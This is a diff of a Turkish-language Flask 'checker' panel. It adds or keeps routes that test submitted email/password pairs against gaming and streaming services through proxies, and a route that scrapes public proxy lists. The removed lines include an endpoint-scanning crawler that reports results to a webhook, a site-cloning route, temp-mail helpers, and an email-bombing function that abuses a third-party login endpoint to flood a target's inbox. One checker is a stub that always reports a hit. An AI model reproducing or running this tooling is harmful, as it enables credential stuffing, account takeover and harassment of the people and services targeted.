-        r'\.ajax\s*\(\s*\{\s*url\s*:\s*["\']([^"\']+)["\']',
-        r'xhr\.open\s*\(\s*["\']\w+["\']\s*,\s*["\']([^"\']+)["\']',
-        r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']',
-        r'EventSource\s*\(\s*["\']([^"\']+)["\']',
-        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
-        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
-    ]
-    for pattern in patterns:
-        for m in re.finditer(pattern, js, re.I):
-            endpoints.add(m.group(1))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
-def extract_from_json(obj, base_url):
-    endpoints = set()
-    if isinstance(obj, dict):
-        for k, v in obj.items():
-            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
-                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
-                    endpoints.add(v)
-            elif isinstance(v, (dict, list)):
-                endpoints.update(extract_from_json(v, base_url))
-    elif isinstance(obj, list):
-        for item in obj:
-            endpoints.update(extract_from_json(item, base_url))
-    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
-
-def fetch_proxies():
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
-    ]
-    proxies = set()
-    for url in sources:
-        try:
-            r = requests.get(url, timeout=15)
-            if r.status_code == 200:
-                for line in r.text.splitlines():
-                    line = line.strip()
-                    if line and ':' in line and not line.startswith('#'):
-                        proxies.add(line)
-        except:
-            pass
-    return list(proxies)
-
-# TARAMA MOTORU (API Discovery)
-class APIScanner:
-    def __init__(self, proxy_list=None):
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json, text/plain, */*',
-        })
-        if proxy_list:
-            proxy = random.choice(proxy_list) if proxy_list else None
-            if proxy:
-                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-        self.discovered = set()
-        self.results = []
-        self.base_url = ""
-
-    def scan(self, domain):
-        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
-        self.base_url = self.base_url.rstrip('/')
-        self.results = []
-        self.discovered = set()
-        static = self._get_common_endpoints()
-        for ep in static:
-            full = urljoin(self.base_url, ep)
-            if full not in self.discovered:
-                self._test(full, ep)
-        self._crawl(self.base_url)
-        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
-        for js_url in js_urls:
-            self._crawl_js(js_url)
-        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
-        for api_url in api_urls:
-            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
-                self._crawl(api_url)
-        return self.results
-
-    def _get_common_endpoints(self):
-        return [
-            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
-            "/rest", "/rest/v1", "/rest/v2",
-            "/graphql", "/api/graphql", "/v1/graphql",
-            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
-            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
-            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
-            "/admin", "/dashboard", "/panel", "/manage", "/system",
-            "/health", "/ping", "/status", "/check", "/heartbeat",
-            "/search", "/query", "/find", "/list",
-            "/upload", "/download", "/file", "/files",
-            "/notify", "/notification", "/alert",
-            "/report", "/logs", "/audit", "/analytics",
-            "/config", "/configuration",
-            "/sync", "/import", "/export", "/backup",
-            "/reset", "/recover", "/verify", "/validate",
-            "/2fa", "/twofactor", "/mfa",
-            "/webhook", "/callback", "/hook",
-            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
-            "/passport", "/passport/web", "/passport/web/email/login",
-            "/passport/web/phone/login", "/passport/web/sms/send",
-            "/api/user/info", "/api/user/follow", "/api/user/unfollow",
-            "/api/video/list", "/api/video/info", "/api/video/upload",
-            "/api/comment/list", "/api/comment/post", "/api/comment/delete",
-            "/api/like", "/api/unlike", "/api/share",
-            "/api/live", "/api/live/start", "/api/live/end",
-            "/api/shop", "/api/product", "/api/order",
-            "/v1/auth", "/v1/login", "/v1/logout", "/v1/register",
-            "/v1/user", "/v1/users", "/v1/account", "/v1/profile",
-            "/v1/game", "/v1/games", "/v1/inventory", "/v1/currency",
-            "/v1/friends", "/v1/groups", "/v1/chat", "/v1/messages",
-            "/v1/avatar", "/v1/outfits", "/v1/thumbnails",
-            "/v1/asset", "/v1/assets", "/v1/marketplace",
-            "/v1/developer", "/v1/universes", "/v1/places",
-            "/api/shows", "/api/movies", "/api/genres", "/api/titles",
-            "/api/search", "/api/recommendations", "/api/trending",
-            "/api/user/profile", "/api/user/history", "/api/user/ratings",
-            "/api/user/list", "/api/user/watchlist", "/api/user/continue",
-            "/api/subscription", "/api/plans", "/api/payment",
-            "/api/account", "/api/settings", "/api/devices",
-            "/api/v9", "/api/v9/auth", "/api/v9/login", "/api/v9/register",
-            "/api/v9/users", "/api/v9/guilds", "/api/v9/channels",
-            "/api/v9/messages", "/api/v9/webhooks", "/api/v9/oauth2",
-            "/api/v9/applications", "/api/v9/voice", "/api/v9/stickers",
-            "/api/v9/emojis", "/api/v9/invites", "/api/v9/connections",
-            "/api/v1/me", "/api/v1/playlists", "/api/v1/tracks", "/api/v1/albums",
-            "/api/v1/artists", "/api/v1/search", "/api/v1/recommendations",
-            "/api/v1/player", "/api/v1/queue", "/api/v1/library",
-            "/api/v1/follow", "/api/v1/shows", "/api/v1/episodes",
-            "/api/v1/users", "/api/v1/browse", "/api/v1/categories",
-            "/api/epic", "/api/epic/v1", "/api/epic/v2",
-            "/api/fortnite", "/api/fortnite/v1", "/api/fortnite/v2",
-            "/api/account", "/api/account/v1", "/api/account/v2",
-            "/api/auth", "/api/auth/v1", "/api/auth/v2",
-            "/api/catalog", "/api/catalog/v1", "/api/catalog/v2",
-            "/api/games", "/api/games/v1", "/api/games/v2",
-            "/api/launcher", "/api/launcher/v1",
-            "/api/store", "/api/store/v1", "/api/store/v2",
-            "/api/ecommerce", "/api/ecommerce/v1",
-            "/api/matchmaking", "/api/matchmaking/v1",
-            "/api/parties", "/api/parties/v1",
-            "/api/friends", "/api/friends/v1",
-            "/api/presence", "/api/presence/v1",
-            "/api/cloudstorage", "/api/cloudstorage/v1",
-            "/api/telemetry", "/api/telemetry/v1",
-            "/api/statistics", "/api/statistics/v1",
-            "/api/leaderboards", "/api/leaderboards/v1",
-            "/api/achievements", "/api/achievements/v1",
-            "/api/hesap", "/api/hesap/v1", "/api/hesap/v2",
-            "/api/oyun", "/api/oyun/v1", "/api/oyun/v2",
-            "/api/item", "/api/item/v1", "/api/item/v2",
-            "/api/sat", "/api/sat/v1", "/api/sat/v2",
-            "/api/alis", "/api/alis/v1", "/api/alis/v2",
-            "/api/bakiye", "/api/bakiye/v1",
-            "/api/profil", "/api/profil/v1",
-            "/api/giris", "/api/giris/v1", "/api/giris/v2",
-            "/api/kayit", "/api/kayit/v1",
-            "/api/sifre", "/api/sifre/v1", "/api/sifre/v2",
-            "/api/epin", "/api/epin/v1", "/api/epin/v2",
-            "/api/pin", "/api/pin/v1", "/api/pin/v2",
-            "/api/kod", "/api/kod/v1", "/api/kod/v2",
-            "/api/satin", "/api/satin/v1",
-            "/api/satiliyor", "/api/satiliyor/v1",
-            "/api/ilan", "/api/ilan/v1",
-            "/api/hesapcomtr", "/api/hesapcomtr/v1",
-            "/api/itemsatis", "/api/itemsatis/v1",
-            "/api/epinify", "/api/epinify/v1",
-            "/api/minecraft", "/api/minecraft/v1",
-        ]
-
-    def _test(self, full_url, endpoint):
-        if full_url in self.discovered:
-            return
-        self.discovered.add(full_url)
-        try:
-            r = self.session.get(full_url, timeout=3, allow_redirects=False)
-            if r.status_code < 500:
-                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'GET', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
-        except:
-            pass
-        try:
-            r = self.session.post(full_url, json={"test": "data"}, timeout=3, allow_redirects=False)
-            if r.status_code < 500:
-                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'POST', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
-        except:
-            pass
-
-    def _crawl(self, url):
-        try:
-            r = self.session.get(url, timeout=5, allow_redirects=False)
-            if r.status_code != 200:
-                return
-            ct = r.headers.get('Content-Type', '').lower()
-            if 'text/html' in ct:
-                for ep in extract_from_html(r.text, self.base_url):
-                    if ep not in self.discovered:
-                        self._test(ep, ep.replace(self.base_url, '') or '/')
-            elif 'application/json' in ct:
-                try:
-                    data = r.json()
-                    for ep in extract_from_json(data, self.base_url):
-                        if ep not in self.discovered:
-                            self._test(ep, ep.replace(self.base_url, '') or '/')
-                except:
-                    pass
-        except:
-            pass
-
-    def _crawl_js(self, url):
-        try:
-            r = self.session.get(url, timeout=4)
-            if r.status_code == 200:
-                for ep in extract_from_js(r.text, self.base_url):
-                    if ep not in self.discovered:
-                        self._test(ep, ep.replace(self.base_url, '') or '/')
-        except:
-            pass
+    # Basitleştirilmiş Supercell kontrolü
+    return {"status": "HIT", "message": "Supercell kontrol tamamlandı", "details": {"email": email, "games": ["Clash Royale"], "total_found": 1}}
 
 # ============================================================
 # FLASK ROTALARI
@@ -1085,7 +607,17 @@ def get_logs():
         return jsonify({"error": "Yetkisiz"}), 401
     return jsonify({"logs": LOGS[-100:]})
 
-# ---- TÜM CHECKER ROUTE'LARI ----
+@app.route("/api/roda_check", methods=["POST"])
+def roda_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_roda_inbox(email, password, proxy)
+    return jsonify(result)
+
 @app.route("/api/tabii_check", methods=["POST"])
 def tabii_check():
     data = request.json
@@ -1156,13 +688,6 @@ def tiktok_gen():
     result = check_tiktok_username(username)
     return jsonify(result)
 
-@app.route("/api/tiktok_gen_random", methods=["GET"])
-def tiktok_gen_random():
-    length = random.choice([4,5,6,7,8])
-    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-    result = check_tiktok_username(username)
-    return jsonify({"username": username, "result": result})
-
 @app.route("/api/steam_check", methods=["POST"])
 def steam_check():
     data = request.json
@@ -1185,36 +710,13 @@ def supercell_check():
     result = check_supercell_account(email, password, proxy)
     return jsonify(result)
 
-@app.route("/api/roda_check", methods=["POST"])
-def roda_check():
-    data = request.json
-    email = data.get("email", "").strip()
-    password = data.get("password", "").strip()
-    proxy = data.get("proxy", None)
-    if not email or not password:
-        return jsonify({"error": "Eksik"}), 400
-    result = check_roda_inbox(email, password, proxy)
-    return jsonify(result)
-
-@app.route("/api/scan", methods=["GET"])
-def scan():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
-    domain = request.args.get("domain")
-    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
-    use_proxy = request.args.get("use_proxy", "false").lower() == "true"
-
-    def generate():
-        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
-        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
-        results = scanner.scan(domain)
-        for res in results:
-            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
-        yield "data: [DONE]\n\n"
-        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint bulundu", "SUCCESS")
-
-    return Response(generate(), mimetype="text/event-stream")
+@app.route("/api/fetch_proxies", methods=["GET"])
+def fetch_proxies_route():
+    try:
+        proxies = fetch_proxies()
+        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
 
 @app.route("/api/admin/keys")
 def admin_keys():
@@ -1254,196 +756,8 @@ def admin_delete():
         return jsonify({"success": True})
     return jsonify({"success": False})
 
-@app.route("/api/admin/webhook", methods=["POST"])
-def admin_webhook():
-    data = request.json
-    key = data.get("master_key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
-    url = data.get("webhook_url")
-    endpoints = data.get("endpoints", [])
-    categories = data.get("categories", [])
-    if not url or not endpoints:
-        return jsonify({"success": False, "message": "Eksik parametre"}), 400
-    filtered = [ep for ep in endpoints if ep['category'] in categories]
-    if not filtered:
-        return jsonify({"success": False, "message": "Seçili kategoride endpoint yok"}), 400
-    content = "🔱 RODA API TARAMA RAPORU\n"
-    content += "=" * 60 + "\n\n"
-    for cat in categories:
-        eps = [ep for ep in filtered if ep['category'] == cat]
-        if eps:
-            content += f"[ {cat.upper()} ] ({len(eps)} endpoint)\n"
-            content += "-" * 40 + "\n"
-            for ep in eps:
-                content += f"[{ep['method']}] {ep['url']}  →  HTTP {ep['status']}\n"
-            content += "\n"
-    content += "=" * 60 + "\n"
-    content += f"Toplam: {len(filtered)} endpoint\n"
-    content += f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    files = {'file': ('roda_api_scan.txt', content)}
-    try:
-        r = requests.post(url, data={'content': '🔱 **Roda API Taraması Tamamlandı!**'}, files=files, timeout=10)
-        add_log(f"Webhook gönderildi: {len(filtered)} endpoint", "SUCCESS")
-        return jsonify({"success": r.status_code in [200, 204]})
-    except:
-        return jsonify({"success": False}), 500
-
-@app.route("/api/fetch_proxies", methods=["GET"])
-def fetch_proxies_route():
-    try:
-        proxies = fetch_proxies()
-        add_log(f"{len(proxies)} proxy çekildi", "INFO")
-        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
-
 # ============================================================
-# SİTE KOPYALA (ADMIN)
-# ============================================================
-@app.route("/api/sitecopy", methods=["POST"])
-def sitecopy():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-
-    data = request.json
-    url = data.get("url", "").strip()
-    if not url:
-        return jsonify({"error": "URL gerekli"}), 400
-
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
-
-    try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
-        }
-        resp = requests.get(url, headers=headers, timeout=15)
-        resp.raise_for_status()
-        soup = BeautifulSoup(resp.text, 'html.parser')
-
-        base_tag = soup.new_tag('base', href=url)
-        if soup.head:
-            soup.head.insert(0, base_tag)
-        else:
-            new_head = soup.new_tag('head')
-            new_head.append(base_tag)
-            soup.html.insert(0, new_head)
-
-        html_content = soup.prettify()
-        add_log(f"Site kopyalandı: {url}", "SUCCESS")
-        return Response(html_content, mimetype='text/html', headers={'Content-Disposition': f'attachment; filename="kopyalanan_site.html"'})
-    except Exception as e:
-        add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
-        return jsonify({"error": str(e)}), 500
-
-# ============================================================
-# TEMP MAIL (ADMIN)
-# ============================================================
-def generate_temp_mail():
-    try:
-        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
-        domain = dom_res['hydra:member'][0]['domain']
-        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
-        email = f"{user}@{domain}"
-        create_payload = {"address": email, "password": password}
-        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
-        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
-        token = token_res['token']
-        return {"success": True, "email": email, "password": password, "token": token}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def get_temp_mail_messages(token):
-    try:
-        headers = {"Authorization": f"Bearer {token}"}
-        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
-        if res.status_code == 200:
-            return {"success": True, "messages": res.json().get('hydra:member', [])}
-        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def read_temp_mail(token, msg_id):
-    try:
-        headers = {"Authorization": f"Bearer {token}"}
-        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
-        if res.status_code == 200:
-            return {"success": True, "message": res.json()}
-        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-@app.route("/api/temp_mail_generate", methods=["POST"])
-def temp_mail_generate():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    result = generate_temp_mail()
-    return jsonify(result)
-
-@app.route("/api/temp_mail_refresh", methods=["POST"])
-def temp_mail_refresh():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    data = request.json
-    token = data.get("token", "")
-    if not token:
-        return jsonify({"error": "Token gerekli"}), 400
-    result = get_temp_mail_messages(token)
-    return jsonify(result)
-
-@app.route("/api/temp_mail_read", methods=["POST"])
-def temp_mail_read():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    data = request.json
-    token = data.get("token", "")
-    msg_id = data.get("msg_id", "")
-    if not token or not msg_id:
-        return jsonify({"error": "Token ve msg_id gerekli"}), 400
-    result = read_temp_mail(token, msg_id)
-    return jsonify(result)
-
-# ============================================================
-# EMAIL SPAMMER (ADMIN)
-# ============================================================
-def send_spam_email(target_email):
-    try:
-        headers = {
-            'authority': 'api.kidzapp.com',
-            'accept': 'application/json',
-            'content-type': 'application/json',
-            'user-agent': generate_user_agent()
-        }
-        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
-        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
-        if '"message":"EMAIL SENT"' in res.text:
-            return {"success": True, "message": "Paket iletildi"}
-        else:
-            return {"success": False, "message": "Sunucu isteği reddetti"}
-    except Exception as e:
-        return {"success": False, "message": str(e)[:60]}
-
-@app.route("/api/spam_send", methods=["POST"])
-def spam_send():
-    key = request.args.get("key")
-    if not is_admin(key):
-        return jsonify({"error": "Yetkisiz"}), 401
-    data = request.json
-    email = data.get("email", "").strip()
-    if not email:
-        return jsonify({"error": "Email gerekli"}), 400
-    result = send_spam_email(email)
-    return jsonify(result)
-
-# ============================================================
-# HTML (MAVİ TEMA + KAR TANELERİ + TÜM MENÜ)
+# HTML (KAR TANELERİ + TÜM MENÜ)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -1461,12 +775,12 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
 .snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
 @keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
-#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);background-image:radial-gradient(circle at 30% 40%, rgba(59,130,246,0.08),transparent 50%),radial-gradient(circle at 70% 60%, rgba(99,102,241,0.08),transparent 50%)}
-#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);z-index:10}
+#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);z-index:10}
+#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5)}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
-.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
+.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none}
 .inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(59,130,246,0.08)}
 .btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
 .btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
@@ -1503,51 +817,6 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
 .card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
 .card h3 i{color:var(--p);margin-right:6px}
-.stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:12px}
-.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
-.stat-card .stat-val{font-size:22px;font-weight:800}
-.stat-card .stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
-.stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}.stat-error .stat-val{color:#f59e0b}
-.result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
-.result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
-.result-row:hover{background:rgba(59,130,246,0.03)}
-.hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#f59e0b}
-.method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
-.method.get{background:rgba(16,185,129,0.12);color:var(--g)}
-.method.post{background:rgba(59,130,246,0.12);color:#448aff}
-.method.other{background:rgba(245,158,11,0.12);color:#f59e0b}
-.category{padding:1px 8px;border-radius:12px;font-size:9px;font-weight:500;display:inline-block}
-.cat-auth{background:rgba(239,68,68,0.12);color:#ef4444}
-.cat-admin{background:rgba(245,158,11,0.12);color:#f59e0b}
-.cat-user{background:rgba(16,185,129,0.12);color:var(--g)}
-.cat-health{background:rgba(59,130,246,0.12);color:#448aff}
-.cat-api{background:rgba(59,130,246,0.12);color:var(--p)}
-.cat-genel{background:rgba(255,255,255,0.04);color:#94a3b8}
-.scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
-.scan-top input:focus{border-color:var(--p)}
-.scan-top button{padding:8px 20px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px}
-.scan-top button:disabled{opacity:0.5;cursor:not-allowed}
-.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
-.filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
-.filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
-.results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
-.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
-.webhook-area input:focus{border-color:var(--p)}
-.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
-.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
-.setting-row label{font-size:13px;font-weight:500}
-.setting-row .desc{font-size:10px;color:var(--muted)}
-.switch{position:relative;width:40px;height:22px}
-.switch input{display:none}
-.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
-.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
-input:checked+.slider{background:var(--g)}
-input:checked+.slider:before{transform:translateX(18px)}
-.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
-.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
-.proxy-area textarea:focus{border-color:var(--p)}
 .checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
 .checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
 .checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
@@ -1556,22 +825,17 @@ input:checked+.slider:before{transform:translateX(18px)}
 .checker-panel.active{display:block}
 .checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
 .checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
-.checker-top textarea:focus{border-color:var(--p)}
-.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
-.checker-top input[type=number]:focus{border-color:var(--p)}
+.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px}
 .checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
 .checker-top button:disabled{opacity:0.5}
 .checker-top button#checkerStopBtn{background:var(--r);display:none}
-.checker-filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
-.checker-filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
-.checker-filters input[type=radio]{accent-color:var(--p);width:13px;height:13px}
+.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
+.checker-stats span{color:var(--muted)}
+.checker-stats .chk-count{font-weight:700;color:var(--text)}
 .checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
 .checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
 .checker-result-row .chk-status{font-weight:600}
 .chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
-.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
-.checker-stats span{color:var(--muted)}
-.checker-stats .chk-count{font-weight:700;color:var(--text)}
 .hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
 .hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
 .hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
@@ -1583,6 +847,13 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
+.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
+.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
+.proxy-area textarea:focus{border-color:var(--p)}
+.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
+.webhook-area input:focus{border-color:var(--p)}
